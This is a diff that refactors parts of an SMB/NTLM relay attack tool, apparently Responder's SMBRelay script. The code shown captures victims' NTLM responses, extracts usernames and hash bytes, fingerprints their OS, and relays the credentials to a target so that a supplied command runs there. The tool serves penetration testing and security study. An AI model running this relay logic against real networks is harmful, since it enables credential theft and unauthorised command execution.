@@ -14,13 +14,27 @@
 #
 # You should have received a copy of the GNU General Public License
 # along with this program.  If not, see <http://www.gnu.org/licenses/>.
-import sys, os, struct,re,socket,random, RelayPackets,optparse,thread
+import sys
+import re
+import socket
+import random
+import optparse
+import thread
 sys.path.append('../')
 from fingerprint import RunSmbFinger
-from odict import OrderedDict
-from utils import longueur
 from socket import *
 from RelayPackets import *
+from packets import *
+from servers.SMB import *
+
+import logging
+Logs = logging
+Logs.basicConfig(filemode="w",filename='SMBRelay-Session.txt',format='',level=logging.DEBUG)
+
+
+def longueur(payload):
+	return struct.pack(">i", len(''.join(payload)))
+
 
 def UserCallBack(op, value, dmy, parser):
     args=[]
@@ -44,19 +58,16 @@ if options.CMD is None:
     print "\n-c mandatory option is missing, please provide a command to execute on the target.\n"
     parser.print_help()
     exit(-1)
-
-if options.TARGET is None:
+elif options.TARGET is None:
     print "\n-t mandatory option is missing, please provide a target.\n"
     parser.print_help()
     exit(-1)
-
-if options.UserToRelay is None:
+elif options.UserToRelay is None:
     print "\n-u mandatory option is missing, please provide a username to relay.\n"
     parser.print_help()
     exit(-1)
 
 ResponderPATH = os.path.dirname(__file__)
-# Set some vars.
 UserToRelay = options.UserToRelay
 Domain  = options.Domain
 Command  = options.CMD
@@ -81,11 +92,6 @@ class Packet:
     def __str__(self):
         return "".join(map(str, self.fields.values()))
 
-#Logger
-import logging
-Logs = logging
-Logs.basicConfig(filemode="w",filename='SMBRelay-Session.txt',format='',level=logging.DEBUG)
-
 #Function used to verify if a previous auth attempt was made.
 def ReadData(outfile,Client, User, cmd=None):
     try:
@@ -93,19 +99,14 @@ def ReadData(outfile,Client, User, cmd=None):
             if cmd is None:
                 String = Client+':'+User
                 if re.search(String.encode('hex'), filestr.read().encode('hex')):
-                    filestr.close()
                     return True
-                else:
-                    return False
+                return False
             if cmd is not None:
                 String = Client+","+User+","+cmd
                 if re.search(String.encode('hex'), filestr.read().encode('hex')):
-                    filestr.close()
                     print "[+] Command: %s was previously executed on host: %s. Won't execute again.\n" %(cmd, Client)
                     return True
-                else:
-                    return False
-
+                return False
     except:
         raise
 
@@ -123,7 +124,6 @@ def ParseHash(data,Client, Target):
             Username, Domain = tuple(var)
             if ReadData("SMBRelay-Session.txt", Client, Username):
                 print "[+]Auth from user %s with host %s previously failed. Won't relay."%(Username, Client)
-                pass
             if Username in UserToRelay:
                 print '%s sent a NTLMv2 Response..\nVictim OS is : %s. Passing credentials to: %s'%(Client,RunSmbFinger((Client, 445)),Target)
                 print "Username : ",Username
@@ -135,7 +135,6 @@ def ParseHash(data,Client, Target):
             Username, Domain = tuple(var)
             if ReadData("SMBRelay-Session.txt", Client, Username):
                 print "Auth from user %s with host %s previously failed. Won't relay."%(Username, Client)
-                pass
             if Username in UserToRelay:
                 print '%s sent a NTLMv1 Response..\nVictim OS is : %s. Passing credentials to: %s'%(Client,RunSmbFinger((Client, 445)),Target)
                 LMHashing = data[65:65+LMhashLen].encode('hex').upper()
@@ -145,9 +144,6 @@ def ParseHash(data,Client, Target):
                 return data[65:65+LMhashLen],data[65+LMhashLen:65+LMhashLen+NthashLen],Username,Domain, Client
             else:
                 print "'%s' user was not specified in -u option, won't relay authentication. Allowed users to relay are: %s"%(Username,UserToRelay)
-                pass
-
-
     except Exception:
         raise
 
@@ -157,12 +153,10 @@ def Is_Anonymous(data):
     if LMhashLen == 0 or LMhashLen == 1:
         print "SMB Anonymous login requested, trying to force client to auth with credz."
         return True
-    else:
-        return False
+    return False
 
 def ParseDomain(data):
-    Domain = ''.join(data[81:].split('\x00\x00\x00')[:1])+'\x00\x00\x00'
-    return Domain
+    return ''.join(data[81:].split('\x00\x00\x00')[:1])+'\x00\x00\x00'
 
 #Function used to know which dialect number to return for NT LM 0.12
 def Parse_Nego_Dialect(data):
